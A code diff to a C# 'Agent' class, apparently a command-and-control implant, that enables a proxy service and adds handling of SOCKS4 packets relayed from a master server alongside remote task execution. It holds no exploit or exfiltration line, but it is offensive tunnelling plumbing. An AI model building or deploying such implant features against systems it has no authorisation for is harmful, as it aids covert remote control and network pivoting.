@@ -22,7 +22,7 @@ namespace Agent
         private INetworkService _networkService;
         private IFileService _fileService;
         private IFrameService _frameService;
-        //private IProxyService _proxyService;
+        private IProxyService _proxyService;
         public AgentMetadata MetaData { get; protected set; }
 
         public readonly Dictionary<string, CancellationTokenSource> TaskTokens = new Dictionary<string, CancellationTokenSource>();
@@ -66,7 +66,7 @@ namespace Agent
             this.MasterCommunicator.FrameReceived += MasterCommunicator_FrameReceived;
             this._networkService = ServiceProvider.GetService<INetworkService>();
             this._fileService = ServiceProvider.GetService<IFileService>();
-            //this._proxyService = ServiceProvider.GetService<IProxyService>();
+            this._proxyService = ServiceProvider.GetService<IProxyService>();
             this._configService = ServiceProvider.GetService<IConfigService>();
             this._frameService = ServiceProvider.GetService<IFrameService>();
 
@@ -182,20 +182,21 @@ namespace Agent
 
                         break;
                     }
-                case NetFrameType.CheckIn:
-                case NetFrameType.TaskResult:
-                    break;
-
                 case NetFrameType.Task:
                     {
-                        var frameData = this._frameService.GetData(frame);
-                        var task = await frameData.BinaryDeserializeAsync<AgentTask>();
+                        var task = this._frameService.GetData<AgentTask>(frame);
                         await HandleTask(task);
+                        break;
+                    }
+                case NetFrameType.Socks:
+                    {
+                        var packet = this._frameService.GetData<Socks4Packet>(frame);
+                        await this._proxyService.HandleSocksPacket(packet, this);
                         break;
                     }
 
                 default:
-                    throw new ArgumentOutOfRangeException();
+                    break;
             }
         }
 
